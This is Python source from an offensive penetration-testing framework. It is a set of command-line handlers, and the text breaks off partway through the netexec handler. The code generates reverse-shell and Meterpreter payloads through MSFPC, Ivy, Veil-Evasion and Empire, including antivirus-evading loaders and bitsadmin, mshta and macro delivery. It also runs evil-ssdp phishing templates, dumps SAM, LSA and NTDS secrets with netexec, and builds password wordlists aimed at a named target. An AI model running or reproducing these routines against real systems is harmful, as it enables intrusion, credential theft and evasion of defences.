    def do_msfpc(self, line):
        """
        Generates payloads using MSFvenom Payload Creator (MSFPC).

        This function checks if `msfpc` is installed and installs it if necessary. It then runs `msfpc`
        with the specified parameters to create a payload for penetration testing.

        :param line: Not used in this implementation but reserved for future use.

        :returns: None

        Manual execution:
        To manually generate a payload using MSFPC, use the following command:
            msfpc <TYPE> <DOMAIN/IP> <PORT> <CMD/MSF> <BIND/REVERSE> <STAGED/STAGELESS> <TCP/HTTP/HTTPS/FIND_PORT> <BATCH/LOOP> <VERBOSE>

        Replace the placeholders with the desired values. For example:
            msfpc windows 192.168.1.10 4444 reverse stageless tcp verbose

        Example usage:
            msfpc windows 192.168.1.10        # Windows & manual IP.
            msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
            msfpc stageless cmd py https      # Python, stageless command prompt.
            msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
            msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
        """

        if not is_binary_present("msfpc"):
            print_warn("Installing msfpc...")
            self.cmd("sudo apt install msfpc -y")

        payload_types = [
            "APK",
            "ASP",
            "ASPX",
            "Bash [.sh]",
            "Java [.jsp]",
            "Linux [.elf]",
            "OSX [.macho]",
            "Perl [.pl]",
            "PHP",
            "Powershell [.ps1]",
            "Python [.py]",
            "Tomcat [.war]",
            "Windows [.exe // .exe // .dll]"
        ]

        print_warn("Select the payload type:")
        for i, payload_type in enumerate(payload_types, start=1):
            print_msg(f"{i}. {payload_type}")

        type_choice = int(input("Enter the number corresponding to the payload type: ")) - 1
        if type_choice < 0 or type_choice >= len(payload_types):
            print_error("Invalid choice. Please select a valid number.")
            return

        selected_type = payload_types[type_choice].split()[0].lower()

        params = {
            "type": selected_type,
            "lhost": input("Enter the target IP or domain (default lhost): ") or self.params["lhost"],
            "lport": input("Enter the port (default lport): ") or self.params["lport"],
            "cmd_msf": input("Enter CMD or MSF (default msf): ") or "msf",
            "bind_reverse": input("Enter BIND or REVERSE (default reverse): ") or "reverse",
            "staged_stageless": input("Enter STAGED or STAGELESS (default stageless): ") or "stageless",
            "protocol": input("Enter protocol (TCP, HTTP, HTTPS, FIND_PORT) (default tcp): ") or "tcp",
            "batch_loop": input("Enter BATCH or LOOP (optional): "),
            "verbose": input("Enter VERBOSE (optional): ")
        }

        msfpc_command = (
            f"msfpc {params['type']} {params['lhost']} {params['lport']} {params['cmd_msf']} "
            f"{params['bind_reverse']} {params['staged_stageless']} {params['protocol']} "
            f"{params['batch_loop']} {params['verbose']}"
        )

        print_msg(f"Generating payload with MSFPC: {msfpc_command}")
        self.cmd(msfpc_command)

        return

    @cmd2.with_category(persistence_category)
    def do_ivy(self, line):
        """
        Generates payloads using Ivy with various options. Ivy is a payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory. Ivy’s loader does this by utilizing programmatical access in the VBA object environment to load, decrypt and execute shellcode.

        This function checks if `Ivy` is installed and installs it if necessary. It then runs `Ivy`
        with the specified parameters to create various payloads.

        :param line: Not used in this implementation but reserved for future use.

        :returns: None

        Manual execution:
        To manually generate a payload using Ivy, use the following command:
            ./Ivy <OPTIONS>

        Replace the placeholders with the desired values. For example:
            ./Ivy -Ix64 test64.vba -Ix86 test32.vba -P Inject -O SampleInject.js
            ./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -process64 C:\\windows\\system32\\notepad.exe -process32 C:\\windows\\SysWOW64\\notepad.exe -O stageless.js

        Example usage:
            ivy staged_inject -Ix64 test64.vba -Ix86 test32.vba -P Inject -O SampleInject.js
            ivy stageless_local -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O stageless.js
            ivy one_liner -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O test.png -stageless
        """

        if not is_binary_present("Ivy"):
            print_warn(f"Ivy is not installed. Installing Ivy... to download option {GREEN}50")
            self.onecmd("download_external")
            self.cmd("go get github.com/fatih/color")
            self.cmd("go get github.com/KyleBanks/XOREncryption/Go")
            self.cmd("go build Ivy.go")


        options = {
            "staged_inject": {
                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -O sessions/{output_file}"
            },
            "staged_local": {
                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file}"
            },
            "stageless_local": {
                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file}"
            },
            "stageless_inject": {
                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -O sessions/{output_file}"
            },
            "stageless_inject_process": {
                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -process64 {process64} -process32 {process32} -O sessions/{output_file}"
            },
            "unhooked_stageless_local": {
                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Local -unhook -O sessions/{output_file}"
            },
            "unhooked_stageless_inject": {
                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -unhook -O sessions/{output_file}"
            },
            "one_liner_non_executable": {
                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -O sessions/{output_file} -stageless"
            },
            "bitsadmin_command": {
                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery bits -stageless"
            },
            "mshta_command": {
                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery hta -stageless"
            },
            "stylesheet_payload": {
                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery xsl -stageless"
            },
            "macro_web_downloader": {
                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery macro -stageless"
            }
        }

        print_warn("Select the payload type:")
        for i, option in enumerate(options.keys(), start=1):
            print_msg(f"{i}. {option.replace('_', ' ').title()}")

        type_choice = int(input("Enter the number corresponding to the payload type: ")) - 1
        if type_choice < 0 or type_choice >= len(options):
            print_error("Invalid choice. Please select a valid number.")
            return

        selected_type = list(options.keys())[type_choice]

        params = {
            "x64_file": "stageless64.bin",
            "x86_file": "stageless32.bin",
            "output_file": input("Enter the Name of the payload (payload.txt): "),
            "process64": input("Enter 64-bit process path (optional): "),
            "process32": input("Enter 32-bit process path (optional): "),
            "url": input("Enter URL (optional): ")
        }

        ivy_command = options[selected_type]["cmd"].format(**params)

        print_msg(f"Generating payload with Ivy: {ivy_command}")
        self.cmd(ivy_command)

        return

    @cmd2.with_category(lateral_movement_category)
    def do_tord(self, line):
        """
        Execute the tor.sh script with the specified port or default to port 80 if no port is provided.

        This function constructs a command to run the `tor.sh` script with superuser privileges,
        it defaults to port 80.
        The command is then printed and executed.

        Parameters:
        line (str): Defaults to "80"

        Returns:
        None

        Example:
        >>> do_tord(self, "")
        sudo bash sessions/tor.sh

        >>> do_tord(self, "")
        sudo bash sessions/tor.sh

        Note:
        Ensure that the `tor.sh` script exists in the `sessions` directory and that you have the
        necessary permissions to execute scripts with `sudo`.
        """
        if not line:
            line = "80"

        command = f"sudo bash sessions/tor.sh {line}"
        print_msg(command)
        self.cmd(command)

        return

    @cmd2.with_category(credential_access_category)
    def do_generatedic(self, line):
        """
        Generates a wordlist based on a target name and a list of characters, with various combinations.

        This function prompts the user for a target name and a wordlist name, then generates various combinations
        of the target name with a given list of characters. The combinations include single, double, triple, fourth,
        fifth, sixth, and intercalated character variations. The generated passwords are saved to the specified
        wordlist file.

        :param line: Not used in this function.

        :returns: None

        Manual execution:
        To manually generate a wordlist, run the script and follow the prompts to enter the target name,
        wordlist name, and additional characters if desired.

        For example:
            Enter target name(Ex. john) ::: john
            Enter wordlist name ::: my_wordlist.txt
            Char List ::: 1 2 3 4 5 6 7 8 9 0 ! @ # $
            Do you want to add more characters in char List[y/n] ::: y
            Enter characters by commas(Ex. : ^,&,*,) ::: ^,&,*
        """

        def single_combo(name, characters, file, total, flag):
            """
            Generates single character combinations with the target name.

            :param name: Target name to use in the combinations.
            :param characters: List of characters to combine with the target name.
            :param file: File object to write the combinations to.
            :param total: Running total of passwords generated.
            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

            :returns: Updated total of passwords generated.
            """
            for char in characters:
                cpass1 = name + char
                if flag:
                    cpass2 = char + name
                    file.write(cpass1 + "\n" + cpass2 + "\n")
                    total += 2
                else:
                    file.write(cpass1 + "\n")
                    total += 1
            return total

        def double_combo(name, characters, file, total, flag):
            """
            Generates double character combinations with the target name.

            :param name: Target name to use in the combinations.
            :param characters: List of characters to combine with the target name.
            :param file: File object to write the combinations to.
            :param total: Running total of passwords generated.
            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

            :returns: Updated total of passwords generated.
            """
            for char1 in characters:
                for char2 in characters:
                    cpass1 = name + char1 + char2
                    if flag:
                        cpass2 = char1 + char2 + name
                        file.write(cpass1 + "\n" + cpass2 + "\n")
                        total += 2
                    else:
                        file.write(cpass1 + "\n")
                        total += 1
            return total

        def triple_combo(name, characters, file, total, flag):
            """
            Generates triple character combinations with the target name.

            :param name: Target name to use in the combinations.
            :param characters: List of characters to combine with the target name.
            :param file: File object to write the combinations to.
            :param total: Running total of passwords generated.
            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

            :returns: Updated total of passwords generated.
            """
            for char1 in characters:
                for char2 in characters:
                    for char3 in characters:
                        cpass1 = name + char1 + char2 + char3
                        if flag:
                            cpass2 = char1 + char2 + char3 + name
                            file.write(cpass1 + "\n" + cpass2 + "\n")
                            total += 2
                        else:
                            file.write(cpass1 + "\n")
                            total += 1
            return total

        def fourth_combo(name, characters, file, total, flag):
            """
            Generates fourth character combinations with the target name.

            :param name: Target name to use in the combinations.
            :param characters: List of characters to combine with the target name.
            :param file: File object to write the combinations to.
            :param total: Running total of passwords generated.
            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

            :returns: Updated total of passwords generated.
            """
            for char1 in characters:
                for char2 in characters:
                    for char3 in characters:
                        for char4 in characters:
                            cpass1 = name + char1 + char2 + char3 + char4
                            if flag:
                                cpass2 = char1 + char2 + char3 + char4 + name
                                file.write(cpass1 + "\n" + cpass2 + "\n")
                                total += 2
                            else:
                                file.write(cpass1 + "\n")
                                total += 1
            return total

        def fifth_combo(name, characters, file, total, flag):
            """
            Generates fifth character combinations with the target name.

            :param name: Target name to use in the combinations.
            :param characters: List of characters to combine with the target name.
            :param file: File object to write the combinations to.
            :param total: Running total of passwords generated.
            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

            :returns: Updated total of passwords generated.
            """
            for char1 in characters:
                for char2 in characters:
                    for char3 in characters:
                        for char4 in characters:
                            for char5 in characters:
                                cpass1 = name + char1 + char2 + char3 + char4 + char5
                                if flag:
                                    cpass2 = char1 + char2 + char3 + char4 + char5 + name
                                    file.write(cpass1 + "\n" + cpass2 + "\n")
                                    total += 2
                                else:
                                    file.write(cpass1 + "\n")
                                    total += 1
            return total

        def sixth_combo(name, characters, file, total, flag):
            """
            Generates sixth character combinations with the target name, adding uppercase characters.

            :param name: Target name to use in the combinations.
            :param characters: List of characters to combine with the target name.
            :param file: File object to write the combinations to.
            :param total: Running total of passwords generated.
            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

            :returns: Updated total of passwords generated.
            """
            from itertools import product
            for combo in product(characters, repeat=6):
                combo_str = ''.join(combo)
                cpass1 = name + combo_str.upper()
                if flag:
                    cpass2 = combo_str.upper() + name
                    file.write(cpass1 + "\n" + cpass2 + "\n")
                    total += 2
                else:
                    file.write(cpass1 + "\n")
                    total += 1
            return total

        def intercalate_combo(name, characters, file, total, flag):
            """
            Generates combinations of the target name and character list, intercalating uppercase and lowercase characters.

            This function generates combinations where each character in the string alternates between uppercase and
            lowercase. It also allows for the addition of the target name at the beginning or the end of the string.

            :param name: Target name to use in the combinations.
            :param characters: List of characters to intercalate with the target name.
            :param file: File object to write the combinations to.
            :param total: Running total of passwords generated.
            :param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

            :returns: Updated total of passwords generated.
            """

            def alternate_case(s):
                """Helper function to alternate the case of characters in a string."""
                return ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(s))

            for combo in product(characters, repeat=6):
                combo_str = ''.join(combo)
                cpass1 = name + alternate_case(combo_str)
                if flag:
                    cpass2 = alternate_case(combo_str) + name
                    file.write(cpass1 + "\n" + cpass2 + "\n")
                    total += 2
                else:
                    file.write(cpass1 + "\n")
                    total += 1
            return total

        def expand_regex(regex):
            """
            Expands a regular expression into a list of characters.

            :param regex: Regular expression string to expand.
            :returns: List of characters matching the regular expression.
            """

            char_list = []
            if regex:
                if '[a-z]' in regex:
                    char_list.extend(list(string.ascii_lowercase))
                if '[A-Z]' in regex:
                    char_list.extend(list(string.ascii_uppercase))
                if '[0-9]' in regex:
                    char_list.extend(list(string.digits))
                if '[!@#$%^&*()]' in regex:
                    char_list.extend(list('!@#$%^&*()'))
            return char_list

        if not line:
            print_msg("Target name: ")
            target_name = input("    ╰─ ").strip()
        else:
            target_name = line

        wordlist_name = f"sessions/dic_{target_name}.txt"

        print_msg("Char List: ")
        char_list = input("    ╰─ ").strip().split()

        print_msg("Enter characters by commas(Ex. : ^,&,*,): ")
        more_chars = input("    ╰─ ").strip().split(',')
        char_list.extend(more_chars)

        print_msg("Do you want to add more characters in char List[y/n]: ")
        add_more = input("    ╰─ ").strip().lower()

        if add_more == 'y':
            print_msg("Enter a regex pattern to generate combinations (optional Ex. [a-z], [A-Z], [0-9] or [!@#$%^&*()]): ")
            regex_input = input("    ╰─ ").strip().split(',')
            if regex_input:
                char_list.extend(expand_regex(regex_input))
        total_passwords = 0
        print_warn("Generating dictionary... this might take a while, so why not grab a coffee and come back to a freshly brewed wordlist? ☕")
        with open(wordlist_name, 'w') as f:
            total_passwords = single_combo(target_name, char_list, f, total_passwords, True)
            total_passwords = double_combo(target_name, char_list, f, total_passwords, True)
            total_passwords = triple_combo(target_name, char_list, f, total_passwords, True)
            total_passwords = fourth_combo(target_name, char_list, f, total_passwords, True)
            total_passwords = fifth_combo(target_name, char_list, f, total_passwords, True)
            total_passwords = sixth_combo(target_name, char_list, f, total_passwords, True)
            total_passwords = intercalate_combo(target_name, char_list, f, total_passwords, True)

        print_msg(f"Wordlist {wordlist_name} generated with {total_passwords} passwords.")
        return

    @cmd2.with_category(recon_category)
    def do_trace(self, line):
        """
        Traces the DNS information for a given domain using the FreeDNS service. (using freedns IP Not your IP)

        This method performs a DNS trace lookup for the specified domain by
        sending an HTTP GET request to the FreeDNS service. If no domain is provided
        in the input parameter `line`, it defaults to using the URL specified in the
        instance's parameters.

        Parameters:
        line (str): The domain name to trace. If not provided, the method uses the
                    domain extracted from `self.params["url"]`.

        Returns:
        None: This method executes a system command and does not return a value.

        Example:
        >>> self.do_trace("example.com")
        Executes a DNS trace for "example.com".

        Notes:
        - Ensure that the `self.params["url"]` is set with a valid URL if no domain
        is provided.
        - The method uses `os.system` to execute the trace command, which may not
        be the most secure or efficient method for production code. Consider using
        a library like `requests` for HTTP operations if security and efficiency
        are concerns.
        """
        if not line:
            url = self.params["url"]
            domain = get_domain(url)
        else:
            domain = line
        if not is_binary_present("batcat"):
            print_warn("Installing batcat")
            self.cmd("sudo apt install bat -y")

        command = f"curl -s -X GET https://freedns.afraid.org/domain/dnstrace.php\?domain\={domain}\&submit\=Trace | batcat"
        print_msg(command)
        self.cmd(command)
        return

    @cmd2.with_category(persistence_category)
    def do_veil(self, line):
        """
        Generates payloads using Veil-Evasion with various options. Veil-Evasion is a payload creation framework
        for generating payloads that evade antivirus detection. This function checks if `Veil-Evasion` is installed
        and installs it if necessary. It then runs `Veil-Evasion` with the specified parameters to create various payloads.

        :param line: Not used in this implementation but reserved for future use.

        :returns: None

        Manual execution:
        To manually generate a payload using Veil-Evasion, use the following command:
            ./Veil-Evasion.py -p <PAYLOAD> --<OPTION> <VALUE>

        Replace the placeholders with the desired values. For example:
            ./Veil-Evasion.py -p python/meterpreter/rev_https LHOST=192.168.1.100 LPORT=443

        Example usage:
            veil python_meterpreter_rev_https LHOST=192.168.1.100 LPORT=443
            veil ruby_meterpreter_rev_tcp LHOST=192.168.1.100 LPORT=4444
        """
        lport = self.params["lport"]
        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return
        if not check_lport(lport):
            return

        if not is_binary_present("Veil-Evasion.py"):
            print_warn("Veil-Evasion is not installed. Installing Veil-Evasion...")
            self.cmd("git clone https://github.com/Veil-Framework/Veil.git external/.exploit/Veil")
            self.cmd("cd external/.exploit/Veil && ./config/setup.sh --force --silent")


        options = {
            "python_meterpreter_rev_https": {
                "cmd": "Veil-Evasion.py -p python/meterpreter/rev_https LHOST={lhost} LPORT={lport} -o {output_file}"
            },
            "ruby_meterpreter_rev_tcp": {
                "cmd": "Veil-Evasion.py -p ruby/meterpreter/rev_tcp LHOST={lhost} LPORT={lport} -o {output_file}"
            },
            "powershell_meterpreter_https": {
                "cmd": "Veil-Evasion.py -p powershell/meterpreter/rev_https LHOST={lhost} LPORT={lport} -o {output_file}"
            },
            "c_sharp_meterpreter_https": {
                "cmd": "Veil-Evasion.py -p csharp/meterpreter/rev_https LHOST={lhost} LPORT={lport} -o {output_file}"
            }
        }

        print_warn("Select the payload type:")
        for i, option in enumerate(options.keys(), start=1):
            print_msg(f"{i}. {option.replace('_', ' ').title()}")

        type_choice = int(input("Enter the number corresponding to the payload type: ")) - 1
        if type_choice < 0 or type_choice >= len(options):
            print_error("Invalid choice. Please select a valid number.")
            return

        selected_type = list(options.keys())[type_choice]

        params = {
            "lhost": lhost,
            "lport": lport,
            "output_file": "sessions/payload.txt"
        }

        veil_command = options[selected_type]["cmd"].format(**params)

        print_msg(f"Generating payload with Veil-Evasion: {veil_command}")
        self.cmd(veil_command)

        return

    @cmd2.with_category(command_and_control_category)
    def do_empire(self, line):
        """
        Generates payloads using PowerShell Empire with various options.

        :param line: Not used in this implementation but reserved for future use.

        :returns: None
        """

        # Check if Empire is installed
        if not is_binary_present("powershell-empire"):
            print_error("PowerShell Empire is not installed. Please install it first.")
            return

        # Define options for different payload types
        options = {
            "windows_launcher_bat": "launcher bat",
            "windows_launcher_ps1": "launcher ps1",
            "windows_launcher_vbs": "launcher vbs",
            "windows_launcher_exe": "launcher exe",
            "windows_macro": "macro",
            "windows_dll": "dll"
        }

        # User input for selecting payload type and parameters
        print_warn("Select the payload type:")
        for i, option in enumerate(options.keys(), start=1):
            print_msg(f"{i}. {option.replace('_', ' ').title()}")

        type_choice = int(input("Enter the number corresponding to the payload type: ")) - 1
        if type_choice < 0 or type_choice >= len(options):
            print_error("Invalid choice. Please select a valid number.")
            return

        selected_type = list(options.keys())[type_choice]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        params = {
            "lhost": lhost,
            "lport": lport,
            "output_file": f"sessions/payload_{lhost}_{lport}.txt"
        }

        empire_command = f"sudo powershell-empire client -p {options[selected_type]} -lhost {params['lhost']} -lport {params['lport']} -o {params['output_file']}"

        self.cmd(empire_command)

        return

    @cmd2.with_category(scanning_category)
    def do_evil_ssdp(self, line):
        """
        Runs evil-ssdp with various options and user-selected templates.

        :param line: Not used in this implementation but reserved for future use.

        :returns: None
        """
        if not is_binary_present("evil-ssdp"):
            print_warn("evil-ssdp is not installed. Installing.")
            self.cmd("sudo apt install evil-ssdp -y")
            return
        templates = ["bitcoin", "microsoft-azure", "office365", "password-vault", "scanner", "xxe-exfil", "xxe-smb"]
        print_warn("Select the template:")
        for i, template in enumerate(templates, start=1):
            print_msg(f"{i}. {template}")

        try:
            template_choice = int(input("Enter the number corresponding to the template: ")) - 1
            if template_choice < 0 or template_choice >= len(templates):
                print_error("Invalid choice. Please select a valid number.")
                return
            lport = self.params["lport"]
            selected_template = templates[template_choice]
            interface = input("Enter the network interface to listen on (e.g., wlp2s0): ").strip()
            port = input("Enter the port for the HTTP server (default seted in lport): ").strip() or lport
            smb_server = input("Enter the IP address of your SMB server (optional, press Enter to skip): ").strip()
            realm = input("Enter the realm for Basic Auth (optional, press Enter to skip): ").strip()
            redirect_url = input("Enter the URL to redirect after phishing (optional, press Enter to skip): ").strip()
            evil_ssdp_command = f"sudo evil-ssdp -t {selected_template} -p {port} {interface}"

            if smb_server:
                evil_ssdp_command += f" -s {smb_server}"
            if realm:
                evil_ssdp_command += f" -r '{realm}'"
            if redirect_url:
                evil_ssdp_command += f" -u {redirect_url}"

            print_msg(f"Running evil-ssdp with command: {evil_ssdp_command}")
            self.cmd(evil_ssdp_command)

        except ValueError:
            print_error("Invalid input. Please enter a valid number.")
        return

    @cmd2.with_category(exploitation_category)
    def do_shellfire(self, line):
        """
        Runs Shellfire with various options and allows generating payloads.

        :param line: Not used in this implementation but reserved for future use.

        :returns: None
        """
        if not is_binary_present("shellfire"):
            print_warn("Shellfire is not installed. Installing.")
            self.cmd("sudo apt install shellfire -y")
            return

        print_warn("Select the option you want to use:")
        options = ["Load Config", "Enable Debugging", "Generate Payload"]
        for i, option in enumerate(options, start=1):
            print_msg(f"{i}. {option}")

        try:
            option_choice = int(input("    [!] Enter the number corresponding to the option: ")) - 1
            if option_choice < 0 or option_choice >= len(options):
                print_error("Invalid choice. Please select a valid number.")
                return

            if options[option_choice] == "Load Config":
                use_existing_config = input("    [!] Do you want to load an existing config file? (yes/no): ").strip().lower()

                if use_existing_config == "yes":
                    config = input("    [!] Enter the name of the config file: ").strip()
                    if not config:
                        print_error("Invalid config file name.")
                        return
                    shellfire_command = f"shellfire -c {config}"

                else:
                    url_ = self.params["url"]
                    url = input("    [!] Enter the target URL (e.g., http://example.com/?param={}): default url from payload.json").strip() or url_
                    cookies = input("    [!] Enter cookies as JSON string (e.g., {\"session_id\": \"123456\"}, or press Enter to skip): ").strip() or "{}"
                    user_agent = input("    [!] Enter User-Agent string (or press Enter to use default): ").strip() or "Mozilla/5.0 LazyOwn Framework"
                    method = input("    [!] Enter HTTP method (get or post, default: get): ").strip() or "get"
                    rport = self.params["rport"]
                    payload_types = ["php", "aspnet"]
                    print_warn("Select the payload type:")
                    for i, payload in enumerate(payload_types, start=1):
                        print_msg(f"{i}. {payload}")

                    payload_choice = int(input("    [!] Enter the number corresponding to the payload: ")) - 1
                    if payload_choice < 0 or payload_choice >= len(payload_types):
                        print_error("Invalid choice. Please select a valid number.")
                        return
                    selected_payload = payload_types[payload_choice]

                    config_data = {
                        "url": url,
                        "cookies": json.loads(cookies),
                        "headers": {
                            "User-Agent": user_agent,
                        },
                        "method": method,
                        "auth_user": "null",
                        "auth_pass": "null",
                        "payload": "whoami",
                        "payload_type": f"{selected_payload}",
                        "encode_chain": [],
                        "files": {},
                        "fuzzfile": "default",
                        "marker": "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--",
                        "marker_idx": [1],
                        "http_port": "80"
                    }
                    path = os.getcwd()
                    sessions = f"{path}/sessions"
                    config_file_name = input("    [!] Enter the name for the new config file (e.g., my_config.json): ").strip() or "my_config.json"
                    file_path = sessions  + "/" + config_file_name
                    with open(file_path, "w") as config_file:
                        json.dump(config_data, config_file, indent=4)

                    print_msg(f"Config file {file_path} created successfully.")
                    shellfire_command = f"shellfire -c {file_path}"

            elif options[option_choice] == "Enable Debugging":
                shellfire_command = "shellfire -d"

            elif options[option_choice] == "Generate Payload":
                payload_types = ["php", "aspnet"]
                print_warn("Select the payload type:")
                for i, payload in enumerate(payload_types, start=1):
                    print_msg(f"{i}. {payload}")

                payload_choice = int(input("    [!] Enter the number corresponding to the payload: ")) - 1
                if payload_choice < 0 or payload_choice >= len(payload_types):
                    print_error("Invalid choice. Please select a valid number.")
                    return
                selected_payload = payload_types[payload_choice]
                shellfire_command = f"shellfire --generate {selected_payload} > sessions/payload_{selected_payload}.{selected_payload}"

            print_msg(f"Running Shellfire with command: {shellfire_command}")
            self.cmd(shellfire_command)

        except ValueError:
            print_error("Invalid input. Please enter a valid number.")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_graph(self, line):
        """
        Generates a graph from JSON payload files containing URL, RHOST, and RPORT.

        :param line: Not used in this implementation but reserved for future use.

        :returns: None
        """
        json_files = glob.glob("*payload*.json")

        if not json_files:
            print_error("No JSON payload files found.")
            return

        graph_content = "digraph G {\n"
        parent_node_name = "LazyOwn"
        parent_node_label = f"{parent_node_name}\nIP: 127.0.0.1\nPort: 5555"
        graph_content += f'"{parent_node_name}" [label="{parent_node_label}"];\n'

        child_nodes = []

        for json_file in json_files:
            try:
                with open(json_file, 'r') as file:
                    data = json.load(file)
                    url = data.get("url", "Unknown URL")
                    rhost = data.get("rhost", "Unknown RHOST")
                    rport = data.get("rport", "Unknown RPORT")
                    node_label = f"{url}\nRHOST: {rhost}\nRPORT: {rport}"
                    node_name = os.path.splitext(json_file)[0]
                    graph_content += f'"{node_name}" [label="{node_label}"];\n'
                    child_nodes.append(node_name)

            except json.JSONDecodeError:
                print_error(f"Error decoding JSON in file: {json_file}")
                continue
            except FileNotFoundError:
                print_error(f"File not found: {json_file}")
                continue
        for child in child_nodes:
            graph_content += f'"{parent_node_name}" -> "{child}";\n'

        for i in range(len(child_nodes)):
            for j in range(i + 1, len(child_nodes)):
                graph_content += f'"{child_nodes[i]}" -> "{child_nodes[j]}";\n'

        graph_content += "}\n"
        with open("sessions/graph.dot", 'w') as dot_file:
            dot_file.write(graph_content)

        os.system("dot -Tpng sessions/graph.dot -o sessions/graph.png -Gbgcolor=lightgrey -Ecolor=blue")

        return

    @cmd2.with_category(scanning_category)
    def do_netexec(self, line):
        """
        Executes netexec with various options for network protocol operations.

        This function handles the installation of netexec and allows the user to execute various network protocol operations with minimal input.
        It reads credentials from a specified file and constructs the necessary commands to interact with the target system.

        :param line: Command line input from the user. This input is used to determine the protocol and action to be executed.
        :returns: None

        The function performs the following steps:
        1. Checks if netexec is installed. If not, it installs it.
        2. Reads credentials from a file.
        3. Constructs and executes the netexec command based on user input.
        4. Enumerates available protocols and actions for each protocol, allowing the user to select them interactively.
        5. Enumerates available options for each action, allowing the user to select them interactively.

        Example usage:
        ```
        do_netexec("smb target -u username -p password --shares")
        ```

        This will execute the SMB protocol with the specified action and options.

        If no specific command is provided, the function will prompt the user to select a protocol and action interactively.
        """
        def install_netexec():
            print_warn("netexec is not installed. Installing.")
            self.cmd("sudo apt install netexec -y")
            print_msg("Installation completed using apt.")

        def install_netexec_pipx():
            print_warn("netexec is not installed. Installing via pipx.")
            self.cmd("sudo apt install pipx git -y")
            self.cmd("pipx ensurepath")
            self.cmd("pipx install git+https://github.com/Pennyw0rth/NetExec")
            print_msg("Installation completed using pipx.")

        if not is_binary_present("netexec"):
            print_warn("netexec is not installed. Select installation method:")
            print_msg("1. Install using apt")
            print_msg("2. Install using pipx")

            try:
                install_choice = int(input("    [!] Enter the number corresponding to the installation method: "))
                if install_choice == 1:
                    install_netexec()
                elif install_choice == 2:
                    install_netexec_pipx()
                else:
                    print_error("Invalid choice. Please select a valid number.")
                    return
            except ValueError:
                print_error("Invalid input. Please enter a valid number.")
                return

        rhost = self.params["rhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        path = os.getcwd()
        tmp_path = f"{path}/sessions"
        threads = 22
        timeout = 33
        jitter = 0

        if line:
            command_parts = line.split()
            protocol = command_parts[0]
            action = command_parts[1] if len(command_parts) > 1 else ""
            options = command_parts[2:]

            command = f"netexec {protocol} {rhost}"

            if action:
                command += f" {action}"

            if options:
                command += " " + " ".join(options)

            self.cmd(command)
            return

        print_warn("Select the protocol you want to use:")
        protocols = ["ssh", "winrm", "smb", "rdp", "wmi", "mssql", "ldap", "ftp", "vnc"]
        for i, protocol in enumerate(protocols, start=1):
            print_msg(f"{i}. {protocol}")

        try:
            protocol_choice = int(input("    [!] Enter the number corresponding to the protocol: ")) - 1
            if protocol_choice < 0 or protocol_choice >= len(protocols):
                print_error("Invalid choice. Please select a valid number.")
                return

            protocol = protocols[protocol_choice]
            actions = {
                "ssh": ["--continue-on-success"],
                "winrm": [],
                "smb": ["--shares", "--users", "--rid-brute", "--local-auth", "-k", "--gen-relay-list", "--groups", "--local-groups", "--loggedon-users", "--pass-pol", "--sam", "--lsa", "--ntds", "-M"],
                "rdp": [],
                "wmi": [],
                "mssql": ["-x", "--get-file"],
                "ldap": ["--users", "--trusted-for-delegation", "--password-not-required", "--admin-count", "--groups", "--kerberoasting", "--asreproast", "--gmsa-convert-id", "--gmsa-decrypt-lsa", "--bloodhound", "--maq", "--adcs"],
                "ftp": ["--ls"],
                "vnc": []
            }
            if actions[protocol]:
                print_warn(f"Select the action for {protocol}:")
                for j, action in enumerate(actions[protocol], start=1):
                    print_msg(f"{j}. {action}")

                action_choice = int(input("    [!] Enter the number corresponding to the action: ")) - 1
                if action_choice < 0 or action_choice >= len(actions[protocol]):
                    print_error("Invalid choice. Please select a valid number.")
                    return

                action = actions[protocol][action_choice]
            else:
                action = None

            options_dict = {
                "ssh": {
                    "--continue-on-success": []
                },
                "winrm": {},
                "smb": {
                    "--shares": [],
                    "--users": [],
                    "--rid-brute": [],
                    "--local-auth": [],
                    "-k": [],
                    "--gen-relay-list": ["relay_list_file"],
                    "--groups": [],
                    "--local-groups": [],
                    "--loggedon-users": [],
                    "--pass-pol": [],
                    "--sam": [],
                    "--lsa": [],
                    "--ntds": [],
                    "-M": ["module_name"]
                },
                "rdp": {},
                "wmi": {},
                "mssql": {
                    "-x": ["command"],
                    "--get-file": ["output_file", "target_file"]
                },
                "ldap": {
                    "--users": [],
                    "--trusted-for-delegation": [],
                    "--password-not-required": [],
                    "--admin-count": [],
                    "--groups": [],
